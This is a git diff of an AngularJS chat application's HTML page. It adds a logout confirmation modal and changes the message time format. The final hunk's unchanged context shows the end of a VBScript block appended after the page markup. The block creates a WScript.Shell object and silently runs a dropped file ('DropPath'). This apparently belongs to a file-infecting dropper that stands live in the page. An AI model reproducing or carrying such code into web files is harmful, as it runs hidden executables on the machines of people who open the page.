@@ -35,6 +35,26 @@
 
 </head>
 <body ng-controller="bodyController">
+<div id="exitWin" class="modal fade bs-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-sm">
+    <div class="modal-content">
+
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span
+          class="sr-only">Close</span></button>
+        <h4 class="modal-title" id="mySmallModalLabel">是否确认退出?</h4>
+      </div>
+      <div class="modal-body">
+        <button ng-click="logout()" type="button" class="btn btn-danger btn-lg btn-block" data-dismiss="modal">
+          <span class="glyphicon glyphicon-off"></span>
+          退出</button>
+      </div>
+    </div><!-- /.modal-content -->
+  </div><!-- /.modal-dialog -->
+</div><!-- /.modal -->
+
+
 <div ng-controller="loginController" class="login" ng-show="!isLogin">
   <img src="img/login-head.png" class="head img-circle">
 
@@ -108,7 +128,7 @@
     <div class="title">
       <div class="win-oper">
         <!--<span class="glyphicon glyphicon-minus min"></span>-->
-        <span class="glyphicon glyphicon-off exit"></span>
+        <span data-toggle="modal" data-target="#exitWin" class="glyphicon glyphicon-off exit"></span>
       </div>
       <!--<div class="toolbar">-->
       <!--<span class="glyphicon glyphicon-plane"></span>-->
@@ -130,7 +150,7 @@
              ng-repeat="message in messages">
           <img class="message-head" class="view-user-info" ng-click="viewUserInfo(message.from)"
                ng-src="/file/view/{{message.from.head}}">
-          <span class="message-time">{{message.createTime|date:'yyyy-MM-dd hh:mm'}}</span>
+          <span class="message-time">{{message.createTime|date:'hh:mm'}}</span>
 
           <div trigger-active="message.isPull" scroll-trigger="pullHistoryMessages(message)"
                trigger-at-end trigger-persist trigger-run
@@ -201,7 +221,7 @@
     <div class="title">
       <div class="win-oper">
         <!--<span ng-click="min()" class="glyphicon glyphicon-minus min"></span>-->
-        <span ng-click="exit()" class="glyphicon glyphicon-off exit"></span>
+        <span data-toggle="modal" data-target="#exitWin" class="glyphicon glyphicon-off exit"></span>
       </div>
       <div class="title-name">
         <span class="text">{{contactTitle}}</span>
@@ -284,5 +304,6 @@ End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
 //-->
+
 
 </SCRIPT>
